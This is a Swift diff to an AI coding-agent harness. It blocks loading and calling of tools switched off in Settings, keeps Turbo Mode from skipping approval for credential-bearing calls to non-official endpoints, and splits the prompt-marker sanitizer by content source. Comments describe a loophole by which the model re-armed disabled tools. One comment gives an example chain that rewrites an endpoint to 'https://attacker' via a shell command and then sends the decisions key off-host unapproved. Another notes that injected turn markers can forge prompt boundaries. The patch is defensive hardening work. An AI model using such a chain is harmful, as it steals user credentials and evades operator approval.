@@ -217,8 +217,8 @@ public final class ShellRunTool: AgentTool {
             print("🛠 [shell_run] HTML output converted: \(rawStdout.utf8.count) -> \(converted.utf8.count) chars")
             rawStdout = "[HTML converted to plain text: \(rawStdout.utf8.count) -> \(converted.utf8.count) chars]\n\(converted)"
         }
-        let cleanStdout = AgentHarness.truncateText(AgentHarness.sanitizeText(rawStdout), limit: maxOutputLength)
-        let cleanStderr = AgentHarness.truncateText(AgentHarness.sanitizeText(stderr.trimmingCharacters(in: .whitespacesAndNewlines)), limit: maxOutputLength)
+        let cleanStdout = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(rawStdout), limit: maxOutputLength)
+        let cleanStderr = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(stderr.trimmingCharacters(in: .whitespacesAndNewlines)), limit: maxOutputLength)
 
         if exitCode == 0 {
             print("🛠 [shell_run] exit=0 cmd='\(String(command.prefix(100)))'")
@@ -324,7 +324,7 @@ public final class FileReadTool: AgentTool {
             do {
                 let (title, chunks, totalChars) = try SemanticDocumentReader.shared.readDocument(at: resolvedPath, maxChunkLength: maxOutputLength)
                 let combined = chunks.map { "=== \($0.title) ===\n\($0.content)" }.joined(separator: "\n\n")
-                let truncated = AgentHarness.truncateText(AgentHarness.sanitizeText(combined), limit: maxOutputLength)
+                let truncated = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(combined), limit: maxOutputLength)
                 let res = AgentHarness.toolSuccessJSON(tool: "file_read", data: [
                     "path": resolvedPath.path,
                     "title": title,
@@ -423,7 +423,7 @@ public final class FileReadTool: AgentTool {
             if !tailText.isEmpty && tailStartIdx > lastIncludedIdx { contentParts.append(tailText) }
 
             let slicedText = contentParts.joined(separator: "\n")
-            let sanitized = AgentHarness.sanitizeText(slicedText)
+            let sanitized = AgentHarness.sanitizeLocalFileText(slicedText)
 
             var resultData: [String: Any] = [
                 "path": resolvedPath.path,
@@ -819,7 +819,7 @@ public final class GrepSearchTool: AgentTool {
             return (AgentHarness.toolErrorJSON(tool: "grep_search", error: err), nil, err, false)
         }
 
-        let sanitized = AgentHarness.sanitizeText(stdout.trimmingCharacters(in: .whitespacesAndNewlines))
+        let sanitized = AgentHarness.sanitizeLocalFileText(stdout.trimmingCharacters(in: .whitespacesAndNewlines))
         let cleanOut = AgentHarness.truncateText(sanitized, limit: maxOutputLength)
         let wasTruncated = cleanOut != sanitized
         let lines = cleanOut
@@ -1980,6 +1980,10 @@ public final class ToolDiscoverTool: AgentTool {
         for name in harness.tools.keys.sorted() {
             guard let tool = harness.tools[name], harness.loadedTools[name] == nil else { continue }
             if PlanModePolicy.withholds(name, in: mode) { continue }
+            // Offering a switched-off capability is the same mistake as
+            // offering a withheld one: the model spends a step on a call the
+            // harness then refuses.
+            if AgentHarness.toolUnavailableReason(name) != nil { continue }
             let cat = tool.catalogCategory
             if let cf = categoryFilter, !cf.isEmpty, cf != "all", cat != cf { continue }
             let summary = tool.catalogSummary
@@ -2100,6 +2104,14 @@ public final class ToolLoadTool: AgentTool {
         // `executeTool` then refused on the next step.
         let turnMode = AgentHarness.executingTurnMode ?? harness.activeMode
         for name in names {
+            // A switched-off capability is refused HERE rather than at call
+            // time: arming it would re-advertise a tool the Settings switch
+            // exists to remove, and the schema would be paid on every turn.
+            if harness.tools[name] != nil, let reason = AgentHarness.toolUnavailableReason(name) {
+                let message = AgentHarness.ToolLoadError.unavailable(name, reason).localizedDescription
+                errors.append("Failed to load tool '\(name)': \(message)")
+                continue
+            }
             // Installed-only: a misspelled name must still be UNKNOWN, not
             // reported as a policy refusal (the same ordering `executeTool`
             // learned so a typo is answered with the available-names hint).
@@ -2666,7 +2678,7 @@ public final class GitStatusTool: AgentTool {
 
         do {
             let res = try await GitController.shared.status(workingDirectory: targetDir)
-            let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeText(res.summary), limit: maxOutputLength)
+            let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(res.summary), limit: maxOutputLength)
             let json = AgentHarness.toolSuccessJSON(tool: "git_status", data: [
                 "branch": res.branch,
                 "upstream": res.upstream as Any,
@@ -2730,7 +2742,7 @@ public final class GitDiffTool: AgentTool {
                 target: target,
                 maxLines: 500
             )
-            let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeText(res.diff), limit: maxOutputLength)
+            let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(res.diff), limit: maxOutputLength)
             let json = AgentHarness.toolSuccessJSON(tool: "git_diff", data: [
                 "target_path": res.targetPath as Any,
                 "is_staged": res.isStaged,
@@ -2862,7 +2874,7 @@ public final class FindSymbolDefinitionTool: AgentTool {
         }
 
         let readable = lines.isEmpty ? "No definitions found for symbol '\(symbolName)'." : lines.joined(separator: "\n")
-        let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeText(readable), limit: maxOutputLength)
+        let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(readable), limit: maxOutputLength)
 
         let json = AgentHarness.toolSuccessJSON(tool: "find_symbol_definition", data: [
             "symbol": symbolName,
@@ -2934,7 +2946,7 @@ public final class FindReferencesTool: AgentTool {
         }
 
         let readable = lines.isEmpty ? "No references found for symbol '\(symbolName)'." : lines.joined(separator: "\n")
-        let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeText(readable), limit: maxOutputLength)
+        let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(readable), limit: maxOutputLength)
 
         let json = AgentHarness.toolSuccessJSON(tool: "find_references", data: [
             "symbol": symbolName,
@@ -2985,7 +2997,7 @@ public final class LintDiagnosticsTool: AgentTool {
         }
 
         let report = await LintDiagnosticsEngine.checkFile(at: resolvedPath, workingDirectory: workingDirectory)
-        let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeText(report.readableSummary), limit: maxOutputLength)
+        let cleanOut = AgentHarness.truncateText(AgentHarness.sanitizeLocalFileText(report.readableSummary), limit: maxOutputLength)
 
         let json = AgentHarness.toolSuccessJSON(tool: "lint_diagnostics", data: [
             "path": report.filePath,
@@ -3529,7 +3541,7 @@ public final class AgentHarness {
             // The skills tool is core only while the feature is on. When the
             // harness is created AFTER `SkillsRegistry.bootstrap`, this reads
             // the persisted switch; a later toggle is applied by `reload`.
-            if name == "skill_load", !SkillsRegistry.shared.config.enabled { continue }
+            if Self.toolUnavailableReason(name) != nil { continue }
             loadedTools[name] = tools[name]
         }
         // The decisions tool is seeded only when a key resolves. Without one
@@ -3537,7 +3549,7 @@ public final class AgentHarness {
         // every call would fail; with one, requiring a discovery turn before a
         // cheap judgment makes the skill too expensive to use. The check is
         // attribute-only, so it never raises a Keychain dialog at launch.
-        if SubQDecisionKeySource.hasAnyKey(), let decision = tools["subq_decide"] {
+        if Self.toolUnavailableReason("subq_decide") == nil, let decision = tools["subq_decide"] {
             loadedTools["subq_decide"] = decision
         }
         syncGrammar()
@@ -3613,6 +3625,7 @@ public final class AgentHarness {
         case unknownTool(String)
         case nonUnloadable(String)
         case withheldInPlanMode(String)
+        case unavailable(String, String)
 
         public var errorDescription: String? {
             switch self {
@@ -3622,7 +3635,36 @@ public final class AgentHarness {
                 return "Tool '\(name)' is a fundamental tool and cannot be unloaded."
             case .withheldInPlanMode(let name):
                 return "Tool '\(name)' is withheld in plan mode and cannot be loaded. Investigate with the read tools you already have, then write the plan."
+            case .unavailable(let name, let reason):
+                return "Tool '\(name)' is installed but unavailable: \(reason) Enable it there and try again."
             }
+        }
+    }
+
+    /// Why an installed tool cannot be armed or called right now, or `nil` when
+    /// it can.
+    ///
+    /// Two capabilities are REGISTERED unconditionally so `tools_discover` can
+    /// show them, but each has its own switch: Skills has a Settings toggle and
+    /// `subq_decide` needs a resolvable key. Without this gate `tools_load` was
+    /// a way around both — it only consulted plan mode, so the model could
+    /// re-arm `skill_load` with Skills off (and could never unload it again,
+    /// because it is in `nonUnloadableToolNames`) and arm `subq_decide` with no
+    /// key, defeating the documented "a disabled feature costs zero tokens"
+    /// invariant and answering the call with a transport error instead of a
+    /// reason.
+    ///
+    /// Both checks are attribute-only, so neither raises a Keychain dialog.
+    public static func toolUnavailableReason(_ name: String) -> String? {
+        switch name {
+        case "skill_load":
+            guard !SkillsRegistry.shared.config.enabled else { return nil }
+            return "Skills are turned off in Settings (Agent & Tools → Skills)."
+        case "subq_decide":
+            guard !SubQDecisionKeySource.hasAnyKey() else { return nil }
+            return "no SubQ decisions key is configured (Settings → Agent & Tools → Decisions)."
+        default:
+            return nil
         }
     }
 
@@ -3645,6 +3687,12 @@ public final class AgentHarness {
         guard !PlanModePolicy.withholds(name, in: effectiveMode) else {
             throw ToolLoadError.withheldInPlanMode(name)
         }
+        // A capability switched off in Settings is not planted by plan mode and
+        // is not unknown; it is unavailable, and arming it would put a schema
+        // back in every turn's prompt that the switch exists to remove.
+        if let reason = Self.toolUnavailableReason(name) {
+            throw ToolLoadError.unavailable(name, reason)
+        }
         let didChange = loadedTools[name] == nil
         loadedTools[name] = tool
         if didChange {
@@ -3659,7 +3707,11 @@ public final class AgentHarness {
         guard tools[name] != nil else {
             throw ToolLoadError.unknownTool(name)
         }
-        guard !Self.nonUnloadableToolNames.contains(name) else {
+        // `skill_load` is fundamental only while Skills is ON. With the feature
+        // off the tool must be removable, or the "disabled" answer told the
+        // model it was fundamental and left the schema billed every turn.
+        if Self.nonUnloadableToolNames.contains(name),
+           Self.toolUnavailableReason(name) == nil {
             throw ToolLoadError.nonUnloadable(name)
         }
         let wasLoaded = loadedTools.removeValue(forKey: name) != nil
@@ -3676,13 +3728,13 @@ public final class AgentHarness {
         for name in Self.coreLoadedToolNames where tools[name] != nil {
             // `skill_load` is core only while the feature is on: its schema is
             // paid on every turn, and a disabled feature should not be billed.
-            if name == "skill_load", !SkillsRegistry.shared.config.enabled { continue }
+            if Self.toolUnavailableReason(name) != nil { continue }
             loadedTools[name] = tools[name]
         }
         // Mirrors `registerDefaultTools`: a configured decisions key keeps
         // `subq_decide` armed, because the skill that teaches it expects to
         // call it without a discovery step first.
-        if SubQDecisionKeySource.hasAnyKey(), let decision = tools["subq_decide"] {
+        if Self.toolUnavailableReason("subq_decide") == nil, let decision = tools["subq_decide"] {
             loadedTools["subq_decide"] = decision
         }
         syncGrammar()
@@ -3766,6 +3818,33 @@ public final class AgentHarness {
         return false
     }
 
+    /// Whether Turbo Mode may skip the approval prompt for this call.
+    ///
+    /// Turbo Mode exists to stop the operator confirming routine writes, and
+    /// it is a blanket switch: it was also skipping the one prompt that guards
+    /// a CREDENTIAL. `shell_run: defaults write … dynamoe_subq_decide_endpoint
+    /// https://attacker` followed by `subq_decide` in the same assistant
+    /// message sent the key off-host with no card at all, because the pin only
+    /// preserved the destination the card *would* have shown. A `subq_decide`
+    /// aimed anywhere but SubQ's own origin is therefore never bypassable;
+    /// every other tool keeps the old behaviour.
+    public static func turboModeMayBypassApproval(
+        toolName: String,
+        arguments: [String: Any],
+        mode: AgentMode,
+        subQEndpoint: URL? = nil
+    ) -> Bool {
+        guard requiresApproval(
+            toolName: toolName,
+            arguments: arguments,
+            mode: mode,
+            subQEndpoint: subQEndpoint
+        ) else { return true }
+        guard toolName == "subq_decide" else { return true }
+        let endpoint = subQEndpoint ?? SubQDecisionSettings.endpoint()
+        return SubQDecisionSettings.origin(endpoint) == SubQDecisionSettings.officialOrigin
+    }
+
     /// True when a `subq_decide` call sends local file bytes or would send the
     /// state to an origin other than SubQ's own.
     public static func subqDecideRequiresApproval(
@@ -3819,6 +3898,11 @@ public final class AgentHarness {
     public func availableToolDefinitions(mode: AgentMode = .code) -> [ToolDefinition] {
         return loadedTools.keys.sorted().compactMap { name -> ToolDefinition? in
             if PlanModePolicy.withholds(name, in: mode) { return nil }
+            // A tool left in `loadedTools` by a state transition (Skills was on
+            // when this turn's set was built) must not be advertised once its
+            // capability is off: the prompt, the grammar mask and the cloud
+            // `tools` array all read this array.
+            if Self.toolUnavailableReason(name) != nil { return nil }
             return loadedTools[name]?.definition
         }
     }
@@ -3848,7 +3932,9 @@ public final class AgentHarness {
         // "installed but not loaded": telling the model to discover one it can
         // never call sends it looking for a capability the environment denies.
         let unloadedCount = tools.keys.filter { name in
-            loadedTools[name] == nil && !PlanModePolicy.withholds(name, in: mode)
+            loadedTools[name] == nil
+                && !PlanModePolicy.withholds(name, in: mode)
+                && Self.toolUnavailableReason(name) == nil
         }.count
         if unloadedCount > 0 {
             prompt += """
@@ -3923,7 +4009,9 @@ public final class AgentHarness {
     /// is actually constrained to. Only the procedural guidance is shared.
     public func buildCloudToolGuidance(mode: AgentMode = .code) -> String {
         let unloadedCount = tools.keys.filter { name in
-            loadedTools[name] == nil && !PlanModePolicy.withholds(name, in: mode)
+            loadedTools[name] == nil
+                && !PlanModePolicy.withholds(name, in: mode)
+                && Self.toolUnavailableReason(name) == nil
         }.count
         var prompt = ""
         // A cloud turn assembles its own prompt, so the plan section has to be
@@ -5011,6 +5099,25 @@ public final class AgentHarness {
             print("🧭 [PLAN] refused '\(call.name)' — withheld in plan mode")
             return (json, rec, false)
         }
+        // Backstop for a capability switched off AFTER this turn's set was
+        // built (or armed through a stale grammar mask). The prompt and the
+        // grammar already hide it, but a subagent, a cloud function call or a
+        // model that emits the name anyway all land here — and `skill_load`
+        // with Skills off would answer with a full SKILL.md the user disabled.
+        if let reason = Self.toolUnavailableReason(call.name) {
+            let err = "UNAVAILABLE: '\(call.name)' is installed but switched off: \(reason) It was not executed. Continue without it, and do not try to load it again."
+            let json = AgentHarness.toolErrorJSON(tool: call.name, error: err)
+            let rec = ToolCallRecord(
+                name: call.name,
+                arguments: strArgs,
+                rawArguments: call.rawArguments,
+                status: .error,
+                output: AgentHarness.renderToolResultForModel(json),
+                error: err,
+                executionDurationSeconds: CFAbsoluteTimeGetCurrent() - startTime
+            )
+            return (json, rec, false)
+        }
         // maxOutputLength (and maxToolOutputLength) is a TOKEN budget; tools work in
         // characters, so convert with a conservative chars-per-token estimate.
         let tokenBudget = maxOutputLength ?? self.maxToolOutputLength
@@ -5449,11 +5556,32 @@ public final class AgentHarness {
         try? NSRegularExpression(pattern: "[A-Za-z0-9+/=]{768,}", options: [])
     }()
 
+    /// The broad pass, for text whose author is NOT the operator: a web page,
+    /// an MCP result, a skill body, a subagent report, an error body.
+    ///
+    /// Local file content uses `sanitizeLocalFileText` instead. The broad pass
+    /// rewrites every family's markers, including ones this repository's own
+    /// source is full of (`ChatPromptFormatter`), so applying it to `file_read`
+    /// output made a file the model was asked to edit come back different from
+    /// the bytes on disk, and a `file_edit` anchor copied from that view could
+    /// never match.
     public static func sanitizeText(_ text: String) -> String {
+        sanitize(text, markers: PromptMarkers.sanitizeControlMarkers)
+    }
+
+    /// The narrow pass, for content the operator owns and may be editing: a
+    /// file read, a grep hit, a shell command's output. Only this app's own
+    /// template syntax is neutralized, so the text stays byte-faithful for an
+    /// anchor.
+    public static func sanitizeLocalFileText(_ text: String) -> String {
+        sanitize(text, markers: PromptMarkers.sanitizeLocalFileMarkers)
+    }
+
+    private static func sanitize(_ text: String, markers: (String) -> String) -> String {
         // Every family's control markers, not just ChatML: a tool result or a
-        // skill description carrying `<|turn>` or a fullwidth role marker
+        // skill description carrying a turn marker or a fullwidth role marker
         // forges a boundary just as well.
-        var s = PromptMarkers.sanitizeControlMarkers(text)
+        var s = markers(text)
         // Scrub inline base64 (data URIs first, then any remaining standalone run)
         // so binary payloads become compact placeholders instead of garbling context.
         if let re = Self.inlineBase64Regex {
@@ -5811,6 +5939,20 @@ public final class AgentHarness {
         return nil
     }
 
+    /// Tools whose result text is the operator's own files, not somebody
+    /// else's prose. Their content gets the narrow marker pass so a read stays
+    /// byte-faithful and a `file_edit` anchor copied from it still matches;
+    /// every other tool (web, MCP, subagents, skills) gets the broad pass.
+    ///
+    /// `renderToolResultForModel` re-sanitizes whatever the tool already
+    /// sanitized, so this list is what keeps that second pass from undoing the
+    /// first.
+    static let localFileContentToolNames: Set<String> = [
+        "shell_run", "file_read", "file_write", "file_edit", "find_files",
+        "grep_search", "codebase_search", "git_status", "git_diff",
+        "find_symbol_definition", "find_references", "lint_diagnostics"
+    ]
+
     /// Renders a tool result JSON into the plain, human-readable form the model should see.
     /// Observations are emitted as text rather than JSON so file content (HTML, code, CSV)
     /// reaches the model without `\"` / `\/` / literal-`\n` escaping — the leading cause of
@@ -5823,8 +5965,17 @@ public final class AgentHarness {
               let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let toolName = obj["tool"] as? String, !toolName.isEmpty else {
             // Already-rendered text still crosses into a tool turn, so the
-            // marker pass runs on it too (it is idempotent).
+            // marker pass runs on it too (it is idempotent). The tool is
+            // unknown here, so the broad pass is the safe choice.
             return sanitizeText(resultJSON)
+        }
+        // A local-file tool's payload is the operator's own bytes; the narrow
+        // pass keeps it faithful for an anchor. Everything else is untrusted.
+        let isLocalFileContent = Self.localFileContentToolNames.contains(toolName)
+        func markers(_ text: String) -> String {
+            isLocalFileContent
+                ? PromptMarkers.sanitizeLocalFileMarkers(text)
+                : PromptMarkers.sanitizeControlMarkers(text)
         }
         let status = (obj["status"] as? String) ?? "success"
         var lines: [String] = []
@@ -5836,9 +5987,9 @@ public final class AgentHarness {
                 lines.append("[\(toolName)] \(status)")
             }
             for (k, v) in obj.sorted(by: { $0.key < $1.key }) where k != "status" && k != "tool" && k != "error" {
-                Self.appendRendered(key: k, value: v, indent: 0, to: &lines)
+                Self.appendRendered(key: k, value: v, indent: 0, to: &lines, markers: markers)
             }
-            return sanitizeText(lines.joined(separator: "\n"))
+            return sanitize(lines.joined(separator: "\n"), markers: markers)
         }
 
         if status == "error" {
@@ -5850,15 +6001,15 @@ public final class AgentHarness {
         let bodyKeys = result.keys.filter { Self.isLongTextValue(result[$0]) }.sorted()
         let metaKeys = result.keys.filter { !Self.isLongTextValue(result[$0]) }.sorted()
         for k in metaKeys {
-            Self.appendRendered(key: k, value: result[k], indent: 0, to: &lines)
+            Self.appendRendered(key: k, value: result[k], indent: 0, to: &lines, markers: markers)
         }
         for k in bodyKeys {
             guard let v = result[k] else { continue }
             lines.append("")
             lines.append("--- \(k) ---")
-            Self.appendLongBody(value: v, indent: 0, to: &lines)
+            Self.appendLongBody(value: v, indent: 0, to: &lines, markers: markers)
         }
-        return sanitizeText(lines.joined(separator: "\n"))
+        return sanitize(lines.joined(separator: "\n"), markers: markers)
     }
 
     private static func isLongTextValue(_ value: Any?) -> Bool {
@@ -5866,7 +6017,13 @@ public final class AgentHarness {
         return s.contains("\n") || s.count > 240
     }
 
-    private static func appendRendered(key: String, value: Any?, indent: Int, to lines: inout [String]) {
+    private static func appendRendered(
+        key: String,
+        value: Any?,
+        indent: Int,
+        to lines: inout [String],
+        markers: (String) -> String
+    ) {
         let pad = String(repeating: "  ", count: indent)
         switch value {
         case .none:
@@ -5882,7 +6039,7 @@ public final class AgentHarness {
         case let s as String:
             if s.contains("\n") || s.count > 240 {
                 lines.append("\(pad)\(key):")
-                Self.appendLongBody(value: s, indent: indent + 1, to: &lines)
+                Self.appendLongBody(value: s, indent: indent + 1, to: &lines, markers: markers)
             } else {
                 lines.append("\(pad)\(key): \(s.isEmpty ? "(empty)" : s)")
             }
@@ -5895,7 +6052,7 @@ public final class AgentHarness {
                 for (i, d) in dicts.enumerated() {
                     lines.append("\(pad)\(key) #\(i + 1):")
                     for (k, v) in d.sorted(by: { $0.key < $1.key }) {
-                        Self.appendRendered(key: k, value: v, indent: indent + 1, to: &lines)
+                        Self.appendRendered(key: k, value: v, indent: indent + 1, to: &lines, markers: markers)
                     }
                 }
             } else {
@@ -5904,17 +6061,22 @@ public final class AgentHarness {
         case let d as [String: Any]:
             lines.append("\(pad)\(key):")
             for (k, v) in d.sorted(by: { $0.key < $1.key }) {
-                Self.appendRendered(key: k, value: v, indent: indent + 1, to: &lines)
+                Self.appendRendered(key: k, value: v, indent: indent + 1, to: &lines, markers: markers)
             }
         default:
             lines.append("\(pad)\(key): \(String(describing: value))")
         }
     }
 
-    private static func appendLongBody(value: Any, indent: Int, to lines: inout [String]) {
+    private static func appendLongBody(
+        value: Any,
+        indent: Int,
+        to lines: inout [String],
+        markers: (String) -> String
+    ) {
         let pad = String(repeating: "  ", count: indent)
         if let s = value as? String {
-            let clean = Self.sanitizeText(s)
+            let clean = Self.sanitize(s, markers: markers)
             if indent == 0 {
                 lines.append(clean)
             } else {
